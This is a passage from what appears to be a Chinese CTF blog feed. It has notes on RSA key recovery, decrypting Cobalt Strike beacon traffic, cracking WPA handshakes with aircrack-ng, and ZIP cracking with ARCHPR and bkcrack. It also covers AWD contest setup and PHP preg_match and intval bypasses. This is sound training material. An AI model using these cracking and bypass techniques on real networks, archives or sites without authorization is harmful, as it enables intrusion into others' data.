class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl rsa -pubin -text -modulus -in warmup -in pub.pem</span><br></pre></td></tr></table></figure><p>生成n,e ;</p><p>16进制转10进制</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">s=&#x27;&#x27;</span><br><span class="line">int(s,16)</span><br></pre></td></tr></table></figure><p>yafu分解factor()</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#coding=utf-8</span><br><span class="line">import math</span><br><span class="line">import sys</span><br><span class="line">from Crypto.PublicKey import RSA</span><br><span class="line">arsa=RSA.generate(1024)</span><br><span class="line">arsa.p=</span><br><span class="line">arsa.q=</span><br><span class="line">arsa.e=</span><br><span class="line">arsa.n=arsa.p*arsa.q</span><br><span class="line">Fn=long((arsa.p-1)*(arsa.q-1))</span><br><span class="line">i=1</span><br><span class="line">while(True):</span><br><span class="line">    x=(Fn*i)+1</span><br><span class="line">    if(x%arsa.e==0):</span><br><span class="line">           arsa.d=x/arsa.e</span><br><span class="line">           break</span><br><span class="line">    i=i+1</span><br><span class="line">private=open(&#x27;private.pem&#x27;,&#x27;w&#x27;)</span><br><span class="line">private.write(arsa.exportKey())</span><br><span class="line">private.close()</span><br></pre></td></tr></table></figure><p>生成私钥</p><p>在kali终端输入openssl进入openssl</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rsautl -decrypt -in flag.enc(密文名称) -inkey private.pem(我们所求得密钥名称)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>流量包解密</title>
      <link href="/2023/09/13/%E6%B5%81%E9%87%8F%E5%8C%85%E8%A7%A3%E5%AF%86/"/>
      <url>/2023/09/13/%E6%B5%81%E9%87%8F%E5%8C%85%E8%A7%A3%E5%AF%86/</url>
      
        <content type="html"><![CDATA[<p>主要还是以题来讲解，主打一个做笔记。</p><h1 id="SICTF-2023-round3"><a href="#SICTF-2023-round3" class="headerlink" title="SICTF 2023 round3"></a>SICTF 2023 round3</h1><h2 id="一起上号不"><a href="#一起上号不" class="headerlink" title="一起上号不"></a>一起上号不</h2><p>主要利用工具:<br>1.Wireshark<br>2.github脚本<br>    (1)CS_Decrypt-main   (ps)其中Beacon_metadata_RSA_Decrypt.py环境不好配置，导致得到key困难。<br>    (2)cs-scripts-master<br>3.为解决环境配置问题使用另一项脚本test.py(在文章下写出)</p><p>首先得到流量包分析得到key 使用cs-scripts-master将RSA密钥导出<br><img src="https://img1.imgtp.com/2023/09/13/GPEjElOm.png"><br>再从流量包中的load中把cookie导出<br><img src="https://img1.imgtp.com/2023/09/13/H2jCNQJX.png"><br><img src="https://img1.imgtp.com/2023/09/13/en8mzOVc.png"><br>把上面两个在Beacon_metadata_RSA_Decrypt.py解密得到AES key和HMCA key<br>(M2Crypto的环境配置不好因此无法解决)<br>修改解密脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">import <span class="built_in">base64</span></span><br><span class="line">import hexdump</span><br><span class="line">import hashlib</span><br><span class="line">import argparse</span><br><span class="line">import javaobj.v2 as javaobj</span><br><span class="line">from Crypto.PublicKey import RSA</span><br><span class="line">from Crypto.Cipher import PKCS1_v1_5</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def parse_arguments():</span><br><span class="line">    parser = argparse.ArgumentParser()</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-f&quot;</span>, <span class="built_in">type</span>=str, default=None, required=True,</span><br><span class="line">                        <span class="built_in">help</span>=<span class="string">&quot;输入JAVA序列化文件 .cobaltstrike.beacon_keys 路径&quot;</span>)</span><br><span class="line">    <span class="built_in">return</span> parser.parse_args()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_RSA_PriKey(SerializeKeyPath):</span><br><span class="line">    with open(SerializeKeyPath, <span class="string">&quot;rb&quot;</span>) as fd:</span><br><span class="line">        pobj = javaobj.load(fd)</span><br><span class="line">    privateKey = pobj.array.value.privateKey.encoded.data</span><br><span class="line">    publicKey = pobj.array.value.publicKey.encoded.data</span><br><span class="line"></span><br><span class="line">    privateKey = (</span><br><span class="line">            b<span class="string">&quot;-----BEGIN PRIVATE KEY-----\n&quot;</span></span><br><span class="line">            + base64.encodebytes(bytes(map(lambda x: x &amp; 0xFF, privateKey)))</span><br><span class="line">            + b<span class="string">&quot;-----END PRIVATE KEY-----&quot;</span></span><br><span class="line">    )</span><br><span class="line">    publicKey = (</span><br><span class="line">            b<span class="string">&quot;-----BEGIN PUBLIC KEY-----\n&quot;</span></span><br><span class="line">            + base64.encodebytes(bytes(map(lambda x: x &amp; 0xFF, publicKey)))</span><br><span class="line">            + b<span class="string">&quot;-----END PUBLIC KEY-----&quot;</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    privateKey = privateKey.decode()</span><br><span class="line">    publicKey = publicKey.decode()</span><br><span class="line">    <span class="built_in">return</span> publicKey, privateKey</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def create_PK_Cipher(privateKey):</span><br><span class="line">    privateKey = RSA.import_key(privateKey.encode())</span><br><span class="line">    n_bytes = privateKey.n.bit_length() // 8</span><br><span class="line">    cipher = PKCS1_v1_5.new(privateKey)</span><br><span class="line">    <span class="built_in">return</span> cipher, n_bytes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def private_decrypt(cipher_text, privateKey):</span><br><span class="line">    cipher, n_bytes = create_PK_Cipher(privateKey)</span><br><span class="line">    cipher_text = base64.b64decode(cipher_text.encode())</span><br><span class="line">    <span class="built_in">return</span> b<span class="string">&#x27;&#x27;</span>.<span class="built_in">join</span>(</span><br><span class="line">        cipher.decrypt(cipher_text[i: i + n_bytes], 0)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(0, len(cipher_text), n_bytes)</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_AES_HMAC_Key(SerializeKeyPath, rsa_cipher_text):</span><br><span class="line">    _, privateKey = get_RSA_PriKey(SerializeKeyPath)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> not (plain_text := private_decrypt(rsa_cipher_text, privateKey)):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+]: 解密错误, 可能是RSA_Cipher_Text或者密钥有误!&quot;</span>)</span><br><span class="line">        <span class="built_in">exit</span>(-1)</span><br><span class="line"></span><br><span class="line">    raw_aes_keys = plain_text[8:24]</span><br><span class="line">    raw_aes_hash256 = hashlib.sha256(raw_aes_keys)</span><br><span class="line">    digest = raw_aes_hash256.digest()</span><br><span class="line">    aes_key = digest[:16]</span><br><span class="line">    hmac_key = digest[16:]</span><br><span class="line">    <span class="built_in">return</span> aes_key, hmac_key, plain_text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    args = parse_arguments()</span><br><span class="line">    SerializeKeyPath = args.f</span><br><span class="line"><span class="comment">#此处放置load导出的cookie</span></span><br><span class="line">    rsa_cipher_text = <span class="string">&quot;U8jm3+oqzYLuUiRd9F3s7xVz7fGnHQYIKF9ch6GRseWfcBSSk+aGhWP3ZUyHIkwRo1/oDCcKV7LYAp022rCm9bC7niOgMlsvgLRolMKIz+Eq5hCyQ0QVScH8jDYsJsCyVw1iaTf5a7gHixIDrSbTp/GiPQIwcTNZBXIJrll540s=&quot;</span></span><br><span class="line">    aes_key, hmac_key, plain_text = get_AES_HMAC_Key(SerializeKeyPath, rsa_cipher_text)</span><br><span class="line">    <span class="built_in">print</span>(f<span class="string">&quot;AES key: &#123;aes_key.hex()&#125;&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(f<span class="string">&quot;HMAC key: &#123;hmac_key.hex()&#125;&quot;</span>)</span><br><span class="line">    hexdump.hexdump(plain_text)</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">使用方法: python test.py -f .cobaltstrike.beacon_keys</span><br></pre></td></tr></table></figure><p>得到结果<br><img src="https://img1.imgtp.com/2023/09/13/YzTqx3dv.png"><br>使用得到的key在Beacon_Task_AES_Decrypt.py将load中的data数据解密得到发送的数据<br>注意:data需要用cyberchef加工一下(From Hex和To Base64)<br><img src="https://img1.imgtp.com/2023/09/13/HHUzI3rw.png"><br><img src="https://img1.imgtp.com/2023/09/13/zMnxM1Zi.png"><br>最后解出flag<br><img src="https://img1.imgtp.com/2023/09/13/ER7fEX9q.png"></p><h1 id="wifi流量包解密"><a href="#wifi流量包解密" class="headerlink" title="wifi流量包解密"></a>wifi流量包解密</h1><p>用于wifi的流量包一般为file.cap<br>wifi连接认证的重点在于WAP的四次握手过程，就是EAPOL协议的包，<br>在wireshark过滤栏中输入eapol查看是否存在四次握手<br>对密码进行爆破<br>如果已知密码位数，即可构造字典<br>kali内命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crunch 11 11 -t 1391040%%%% &gt;&gt;file.txt</span><br></pre></td></tr></table></figure><p>使用工具aircrack-ng<br>在bin文件目录下，字典文件及wifi流量包文件都在的情况下<br>使用命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aircrack-ng -w file.txt file.cap</span><br></pre></td></tr></table></figure><p>使用模式3即可爆破。</p>]]></content>
      
      
      <categories>
          
          <category> misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>zip压缩包取证</title>
      <link href="/2023/09/12/zip%E5%8E%8B%E7%BC%A9%E5%8C%85%E5%8F%96%E8%AF%81/"/>
      <url>/2023/09/12/zip%E5%8E%8B%E7%BC%A9%E5%8C%85%E5%8F%96%E8%AF%81/</url>
      
        <content type="html"><![CDATA[<h1 id="ZIP-破解"><a href="#ZIP-破解" class="headerlink" title="ZIP 破解"></a>ZIP 破解</h1><h2 id="伪加密"><a href="#伪加密" class="headerlink" title="伪加密"></a>伪加密</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>在 ZIP 文件中，数据区与目录区中的 Flags 应该是相同的值。当数据区的标志位为加密标志，而目录区的标志位为非加密标志时，这个时候许多 ZIP 软件会将其识别为被加密，但实际上并不存在对应的密码。</p><h3 id="破解"><a href="#破解" class="headerlink" title="破解"></a>破解</h3><p>只需要将数据区和目录区的标志位置为0即可。</p><h2 id="弱密码爆破"><a href="#弱密码爆破" class="headerlink" title="弱密码爆破"></a>弱密码爆破</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>说白了就是用工具将各种符号和数字排列测试密码，通常用于6位数以下的密码。</p><h3 id="破解-1"><a href="#破解-1" class="headerlink" title="破解"></a>破解</h3><p>一般来说推荐使用 ARCHPR 对 ZIP 压缩包进行暴力破解处理。一般是范围内枚举（例如纯数字或数字与字母的排列组合）或是使用专有的字典进行弱密码爆破。<br>同时也可以使用 hashcat 和 bkcrack 对 ZIP 的密码进行破解。</p><h2 id="CRC-碰撞"><a href="#CRC-碰撞" class="headerlink" title="CRC 碰撞"></a>CRC 碰撞</h2><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>当压缩文件内容较少或仅有部分明文未知时，可以采用 CRC 碰撞的方式去暴力破解明文（因为压缩包中保存的 CRC 校验值为压缩前内容的校验）。</p><h3 id="破解-2"><a href="#破解-2" class="headerlink" title="破解"></a>破解</h3><p>可以使用 Python 脚本进行爆破，但下面的脚本仅是示例，如果有特别的需求（例如未知明文在已知明文中间段时）需要自行修改脚本。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import binascii</span><br><span class="line">import itertools</span><br><span class="line"></span><br><span class="line">def CRCcrack(unknownBytes: int, targetCRC: int, known: bytes = b<span class="string">&#x27;&#x27;</span>) -&gt; list[bytes]:</span><br><span class="line">    <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">    CRC 碰撞</span></span><br><span class="line"><span class="string">    Parameters:</span></span><br><span class="line"><span class="string">        unknownBytes - 未知的字节数</span></span><br><span class="line"><span class="string">        known - 已知明文（默认为拼接）</span></span><br><span class="line"><span class="string">    Returns:</span></span><br><span class="line"><span class="string">        完整明文</span></span><br><span class="line"><span class="string">    &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">    rst = []</span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> itertools.product(range(128), repeat=unknownBytes):</span><br><span class="line">        msg = known + bytes(m)</span><br><span class="line">        crc = binascii.crc32(msg)</span><br><span class="line">        <span class="keyword">if</span> crc == targetCRC:</span><br><span class="line">            rst.append(msg)</span><br><span class="line">    <span class="built_in">return</span> rst</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(CRCcrack(3, binascii.crc32(b<span class="string">&#x27;123&#x27;</span>)))</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">使用方法:python crc32.py reverse 0x4FA83D8C</span><br></pre></td></tr></table></figure><h2 id="明文攻击"><a href="#明文攻击" class="headerlink" title="明文攻击"></a>明文攻击</h2><h3 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h3><p>ZIP 加密模式本质上是将密码转化为内置的一个密钥进行加密的，而密钥是有限长度的，所以如果我们知道一个压缩包内其中一个文件的完整明文，那么我们就可以通过算法将密钥百分百地计算出来（理论上可以把密码也百分百计算出来），且理论上破解速度只与被压缩文件大小有关。</p><h3 id="破解-3"><a href="#破解-3" class="headerlink" title="破解"></a>破解</h3><p>推荐使用 ARCHPR 的明文攻击模式进行破解，需要一个明文压缩包和含有明文文件的密文压缩包，其中他们的压缩算法应该是相同的。<br>同时也可以使用 bkcrack 进行破解。</p><h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><p>文本文件如果编码不同（例如 UTF-8 与 GBK）可能导致压缩出来的大小不同，所以各种编码都需要尝试一次。<br>不同的压缩软件压缩出来的文件可能会导致 ARCHPR 报错，一般推荐 Bandizip 与 WinRAR 都尝试一次。</p><h2 id="深入明文攻击"><a href="#深入明文攻击" class="headerlink" title="深入明文攻击"></a>深入明文攻击</h2><h3 id="原理-4"><a href="#原理-4" class="headerlink" title="原理"></a>原理</h3><p>ZIP 加密模式本质上是将密码转化为内置的一个密钥进行加密的，而密钥是有限长度的，而且 ZIP 的加密方式使得我们可以只解密部分密文，如果我们知道某个文件的部分密文，那么我们可以遍历所有可能的密钥去进行比对（类似 CRC 碰撞的原理）。<br>但仅有 ZipCrypto Deflate 算法和 ZipCrypto Store 算法可以用此方式破解。</p><h3 id="破解-4"><a href="#破解-4" class="headerlink" title="破解"></a>破解</h3><p>使用 bkcrack 需要已知明文的十二个字节和偏移，其中八个字节必须连续。<br>需要使用到的参数：</p><p>-C file.zip加密压缩包<br>-c file提取的密文文件（密文部分）<br>-p key.txt指定明文部分<br>-x offset hex指定偏移量和部分明文十六进制值<br>-o offset指定明文部分的偏移量<br>-k key1 key2 key3指定三段解密密钥<br>-d file解压缩得到的目标文件</p><p>例如针对 JPG 的压缩包，我们可以使用以下命令：</p><p>首先生成明文文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -n <span class="string">&quot;FFD8FFE000104A4649460001&quot;</span> | xxd -r -ps &gt; key.txt</span><br></pre></td></tr></table></figure><p>随后进行密钥爆破：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bkcrack -C 1.zip -c t.jpg -p key.txt -o 0</span><br></pre></td></tr></table></figure><p>或者是针对 ZIP 的压缩包，我们可以使用以下命令：<br>首先我们这个 ZIP 中存在 flag.txt 的明文：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -n <span class="string">&quot;flag.txt&quot;</span> &gt; key.txt</span><br></pre></td></tr></table></figure><p>其次我们知道 ZIP 文件的头，故进行密钥爆破：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bkcrack -C 1.zip -c flag.zip -p key.txt -o 30 -x 0 504B03041400</span><br></pre></td></tr></table></figure><p>需要注意的是，当已知字节数越多时，得到的密钥越准确。<br>得到三段密钥后我们进行提取：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bkcrack -C 1.zip -c flag.zip -k 683a571e f954e70c 49da18ac -d 111.zip</span><br></pre></td></tr></table></figure><p>需要注意的是，如果文件是使用 Deflate 算法进行压缩的话，需要使用其自带的 inflate.py 脚本（在 .&#x2F;tools&#x2F; 文件夹中）进行解压缩：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python inflate.py &lt; 1.jpg &gt; 2.jpg  </span><br></pre></td></tr></table></figure><h2 id="长密码哈希"><a href="#长密码哈希" class="headerlink" title="长密码哈希"></a>长密码哈希</h2><p>ZIP 内部使用 PBKDF2 算法，在 AES-256 加密模式下（包括 ZIPX），如果输入密码长度超过 64 字节，它会使用 PBKDF2 重新生成密钥，新生成的哈希值作为文件的实际密码。<br>换句话说，就是实际密码&#x3D;SHA1(输入密码)。</p><h2 id="特殊实例"><a href="#特殊实例" class="headerlink" title="特殊实例"></a>特殊实例</h2><p>以时间戳作为密码</p><h3 id="原理-5"><a href="#原理-5" class="headerlink" title="原理"></a>原理</h3><p>时间戳一般是一个两位小数，ZIP 文件所保存的创建时间和更新时间并不一定与当时所获取的时间戳是一致的，也许会差几秒，所以我们需要先将文件创建时间转化为时间戳，然后进行掩码爆破。</p><h3 id="破解-5"><a href="#破解-5" class="headerlink" title="破解"></a>破解</h3><p>例如文件创建时间为 2019&#x2F;05&#x2F;17 8:25:28，我们使用如下脚本进行转化时间戳</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import time</span><br><span class="line"></span><br><span class="line">a = time.struct_time((<span class="number">2019</span>,<span class="number">5</span>,<span class="number">17</span>,<span class="number">8</span>,<span class="number">25</span>,<span class="number">28</span>,-<span class="number">1</span>,-<span class="number">1</span>,-<span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(time.mktime(a))</span><br><span class="line">得到结果 1558052728.0，设置掩码 15580?????.?? 或者 15580?????.? 爆破即可。</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023ciscn华中赛区</title>
      <link href="/2023/07/06/2023ciscn%E5%8D%8E%E4%B8%AD%E8%B5%9B%E5%8C%BA/"/>
      <url>/2023/07/06/2023ciscn%E5%8D%8E%E4%B8%AD%E8%B5%9B%E5%8C%BA/</url>
      
        <content type="html"><![CDATA[<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h1 id="奇怪的图片-关于ARCHPR的明文爆破"><a href="#奇怪的图片-关于ARCHPR的明文爆破" class="headerlink" title="奇怪的图片(关于ARCHPR的明文爆破)"></a>奇怪的图片(关于ARCHPR的明文爆破)</h1><p>下载附件得到一个打开报错的zip压缩包文件<br>可以用010查看文件有没有可以分离的文件<br><img src="https://s1.ax1x.com/2023/07/06/pC6fcz8.png"><br>也可以将文件拉入kali内binwalk看一下有没有可以分离的文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk 文件名</span><br></pre></td></tr></table></figure><p>效果如图<br><img src="https://s1.ax1x.com/2023/07/06/pC6fsit.png"><br>但是binwalk自带的分离式没有办法分离出来的<br>所以就需要用foremost分离工具(也在kali内，需要自行安装)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">foremost 文件名</span><br></pre></td></tr></table></figure><p>在output内可以看到有zip和jpg两种文件夹，观察发现已有图片的大小和压缩包内文件大小相同，又由于压缩包要密码才能查看图片内容，所以直接使用明文爆破<br>所谓明文爆破，就是压缩包内其中一个文件CRC32效验码与已有文件的CRC32效验码相同，并且名字相同，压缩算法相同，此时便可以使用明文爆破得出密码<br><img src="https://s1.ax1x.com/2023/07/06/pC6f6Rf.png"><br><img src="https://s1.ax1x.com/2023/07/06/pC6fyJP.png"><br>最后一个图片是一个简单的修改长度，把高度改高就得到flag了</p>]]></content>
      
      
      <categories>
          
          <category> 比赛wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 比赛wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于参加awd的一些小总结</title>
      <link href="/2023/05/31/%E5%85%B3%E4%BA%8E%E5%8F%82%E5%8A%A0awd%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%80%BB%E7%BB%93/"/>
      <url>/2023/05/31/%E5%85%B3%E4%BA%8E%E5%8F%82%E5%8A%A0awd%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h2 id="参加awd的步骤"><a href="#参加awd的步骤" class="headerlink" title="参加awd的步骤"></a>参加awd的步骤</h2><p>我参加的awd比赛直到现在全部都是内部的训练赛，晚上7:00开始，9：30左右结束。<br>参加的awd平台为bugku。<br>加入比赛，等待比赛开始，在开始的前十分钟就无法报名参加了，并且每个队伍的ip也已经可以发现了，这个时候就用到脚本去扫描ip<br>附上扫描脚本(会根据所连WiFi的快慢影响扫描的速度)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line"></span><br><span class="line">os.system(<span class="string">&#x27;chcp 65001&#x27;</span>) <span class="comment">#将cmd的显示字符编码从默认的GBK改为UTF-8</span></span><br><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> range(0,255):</span><br><span class="line">    cmd = <span class="string">&quot;ping&quot;</span> + <span class="string">&quot;192-168-1-&quot;</span>+str(num)+<span class="string">&quot;.pvp2294.bugku.cn&quot;</span> <span class="comment">#在这里修改需要扫描的ip地址</span></span><br><span class="line">    res = os.system(cmd)</span><br></pre></td></tr></table></figure><p>在比赛开始5分钟后，队伍会下发token(也就是提交flag的认证之一，用于编写自动提交flag的脚本)<br>现在来说说比赛开始后的注意事项。<br>比赛开始后，得到队伍的用户名和密码，用xshell连接，连接成功后也可开启xftp连接。xshell用于之后的防护和清理木马，xftp用于刚刚开始的下载html文件，审计内部源码。<br><a href="https://www.shell.com/zh/free-for-home-school/">xhell及xftp的下载地址</a><br><a href="https://www.d99net.net/">D盾的下载地址</a></p><h2 id="D盾的使用"><a href="#D盾的使用" class="headerlink" title="D盾的使用"></a>D盾的使用</h2><p>D盾是一个强大的自动审计代码的软件，把需要扫描的目录直接拖进扫描栏里，等待5-10秒钟大概就能知道具体哪些地方有危险，等级多少，等级越高的木马越容易被利用。</p><h2 id="关于xshell命令行界面备份文件"><a href="#关于xshell命令行界面备份文件" class="headerlink" title="关于xshell命令行界面备份文件"></a>关于xshell命令行界面备份文件</h2><p>压缩命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -zcvf ~/html.tar.gz *</span><br></pre></td></tr></table></figure><p>解压命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -xzvf file.tar.gz</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>PHP特性</title>
      <link href="/2023/05/26/php%E7%89%B9%E6%80%A7/"/>
      <url>/2023/05/26/php%E7%89%B9%E6%80%A7/</url>
      
        <content type="html"><![CDATA[<h2 id="preg-match-函数"><a href="#preg-match-函数" class="headerlink" title="preg_match()函数"></a>preg_match()函数</h2><p>1.preg_match()无法处理数组，当需要绕过此函数时可以在参数前增加数组符号即可绕过。</p><p>2.preg_match()内会增加一些形态表示过滤的范围。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">例如:preg_match(<span class="string">&#x27;/^php/im&#x27;</span>,<span class="variable">$a</span>)</span><br><span class="line">这个就代表对php大小写进行检测和逐行检查</span><br></pre></td></tr></table></figure><p>一共有6种类型<br>(1):i<br>不区分大小写。<br>(2):m<br>多行匹配，若存在换行符&#x2F;n并且有开始^或结束$符的情况下，将以换行为分隔符，逐行进行匹配。<br>(3):s<br>特殊字符圆点.中包含换行符.默认的圆点.是匹配除换行符\n之外的任何单字符，加上s之后,.包含换行符。<br>(4):A<br>强制从目标字符串开头匹配<br>(5):D<br>如果使用$限制结束字符，则不允许结尾有换行符。<br>(6):e<br>配合函数preg_replace使用，可以把匹配来的字符串当作正则表达式来执行。</p><h2 id="intval-函数"><a href="#intval-函数" class="headerlink" title="intval()函数"></a>intval()函数</h2><p>1.intval()函数用于获取变量的整数值。</p><p>2.intval($t,$f)<br>说明:<br>    $t是要进行转换的值<br>    $f转化所使用的进制</p><pre><code>如果$f是0，则通过检测$t的格式来决定使用的进制如果包含了0x的前缀，使用16进制(hex)；如果使用0开头，使用8进制否则使用十进制。</code></pre><p>(在参数传给载体之前，php会将运算结果传入参数载体所以科学计数法也可绕过)<br>intval函数收到内收到字母就会停止读取。<br>22e2&#x3D;22*(10^2)&#x3D;2200.0而intval收到的是22e2反馈22</p><h2 id="关于强比较的绕过"><a href="#关于强比较的绕过" class="headerlink" title="关于强比较的绕过"></a>关于强比较的绕过</h2><p>强比较的符号是‘&#x3D;&#x3D;&#x3D;’要求一般是左右参数的值相等并且类型相同<br>例如左边是int类型，右边即一定需要是int类型才能成立</p><h2 id="strpos-函数"><a href="#strpos-函数" class="headerlink" title="strpos()函数"></a>strpos()函数</h2><p>strpos($f,$t)<br>查找字符串在另一字符串中第一次出现的位置<br>说明:<br>    $f是接受检测的字符串<br>    $t是检测的字符或者字符串<br>    例如strops(“0123”,”1”)<br>    检测结果是1,也就是字符串的第二个位置(数字是从0开始数)</p><h2 